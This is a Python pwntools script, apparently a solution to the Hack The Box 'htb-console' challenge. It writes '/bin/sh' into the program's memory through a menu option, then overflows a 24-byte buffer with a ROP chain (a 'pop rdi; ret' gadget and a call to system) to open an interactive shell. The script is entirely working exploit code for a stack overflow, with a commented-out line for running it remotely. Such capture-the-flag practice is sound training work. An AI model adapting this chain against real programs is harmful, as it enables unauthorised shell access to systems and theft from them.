from pwn import *

context(os='linux', arch='amd64')

executable = '/home/kali/Downloads/htb-console'
padding_length = 24
command = '/bin/sh'

#################################################
# Create ROP Chain

elf = context.binary = ELF(executable)


rop = ROP(elf)

rop.raw(p64((rop.find_gadget(['pop rdi', 'ret']))[0]))
rop.raw(p64(0x4040b0))
rop.call(elf.symbols["system"])

#####################################################
# Create Payload

payload = [
    b"A" * padding_length,
    rop.chain()
]

payload = b"".join(payload)

###################################################
# Run Process

io = elf.process()
#io = remote('', )

log.info('add command to memory')
io.sendlineafter('>>', 'hof')
io.sendlineafter('name: ', command)

log.info('Send Command flag')
io.sendlineafter('>>', 'flag')

log.info('Send Payload')
io.sendlineafter('flag: ', payload)

io.interactive()


